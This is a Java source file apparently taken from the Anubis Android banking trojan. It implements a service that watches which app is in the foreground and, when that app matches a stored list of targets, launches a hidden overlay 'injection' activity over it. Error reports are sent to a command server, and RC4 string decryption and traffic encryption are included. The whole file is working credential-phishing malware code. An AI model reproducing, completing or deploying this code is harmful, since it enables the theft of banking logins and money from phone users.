package anubis.bot.myapplication;


import android.app.ActivityManager;
import android.app.IntentService;
import android.app.KeyguardManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Base64;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.API.ProcessesSDK6.classProcAndroidAppProcess;
import anubis.bot.myapplication.API.ProcessesSDK6.classProcAndroidPROCESSES;
import anubis.bot.myapplication.Activity.ActivityInjection;

public class ServiceInjections extends IntentService {
    UtilsClass SF = new UtilsClass();
    Context context;
    Constants const_ = new Constants();
    public ServiceInjections() {
        super("");


    }

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    private ArrayList<String> getTopApp()
    {
              ArrayList<String> activePackages = new ArrayList();
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {

            ActivityManager am = (ActivityManager) this.getSystemService(ACTIVITY_SERVICE);
            List<ActivityManager.RunningTaskInfo> TI = am.getRunningTasks(1);
            ComponentName CI = TI.get(0).topActivity;
            activePackages.add( TI.get(0).topActivity.getPackageName());
            return activePackages;
        }
        else if((Build.VERSION.SDK_INT > Build.VERSION_CODES.KITKAT)&&(Build.VERSION.SDK_INT <= Build.VERSION_CODES.LOLLIPOP)){
            ActivityManager man = (ActivityManager)this.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> TA = man.getRunningAppProcesses();
            activePackages.add(TA.get(0).processName);
            return activePackages;
        }else if((Build.VERSION.SDK_INT > Build.VERSION_CODES.LOLLIPOP)&&(Build.VERSION.SDK_INT <= 23)){
            List<classProcAndroidAppProcess> topProcesses = classProcAndroidPROCESSES.getRunningForegroundApps(this);
            ArrayList<String> result = new ArrayList();
            for (classProcAndroidAppProcess process : topProcesses) {
                result.add(process.getPackName().trim());
            }
            return result;
        }else if(Build.VERSION.SDK_INT >= 24){
            activePackages.add(SF.getProcessNameAPI24(context));
            return activePackages;
        }
        activePackages.add(SF.getProcessNameAPI24(context));

        return activePackages;
    }
    @Override
    protected void onHandleIntent(Intent intent) {
        context=this;
        SF.SetWrite(context,"name","false");
        if(SF.SetRead(context, "save_inj").length()<=5) stopSelf();
        StartScanInjector();
    }

    void StartScanInjector()
    {
        SF.Log("Start","apiProc");

        int t=0;
        String data_file = SF.SetRead(context, "save_inj");
        while(true) {
           if (t == 0){
               data_file = SF.SetRead(context, "save_inj");
                if(data_file.length()<=4) {
                    stopSelf();
                    break;
                }
            }if (t >= 40) t = -1;
            t++;

            if(SF.checkAccess(this)){
                stopSelf();
            }

            KeyguardManager km2 = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
            boolean locked2 = km2.inKeyguardRestrictedInputMode();
            if (locked2 == false) {
                if ((data_file != "") && (SF.isConnectedWifiOrMobile(context))) {
                    try {
                        TimeUnit.MILLISECONDS.sleep(10);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    ArrayList<String> packageNames = getTopApp();
                    String nameInject = null;
                    SF.Log("App", "" + packageNames);

                    for (int i4 = 0; i4 < data_file.split("/").length; i4++) {
                        String nameApp[] = data_file.split("/")[i4].split(",");
                        for (int j = 1; j < nameApp.length; j++) {
                            if (packageNames.contains(nameApp[j])) {
                                nameInject = nameApp[0];
                                break;
                            }
                        }
                        if (nameInject != null) break;
                    }

                    if (nameInject != null) {
                        //*************Проверка состояние экрана*******
                        KeyguardManager km = (KeyguardManager) getSystemService(context.KEYGUARD_SERVICE);
                        boolean locked = km.inKeyguardRestrictedInputMode();
                        if (!locked){
                            try {
                                String set = SF.SetRead(context, "name");
                                if (!set.contains("true")) {
                                        Intent dialogIntent = new Intent(ServiceInjections.this, ActivityInjection.class)
                                                .putExtra("str", nameInject);
                                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                                        startActivity(dialogIntent);
                                }
                            } catch (Exception ex) {
                                SF.POST(context, "4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|ERROR START INJECTIONS|"));
                            }
                        }
                    }
                }
            }else{
                try {
                    TimeUnit.MILLISECONDS.sleep(10);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
      }
    }
}
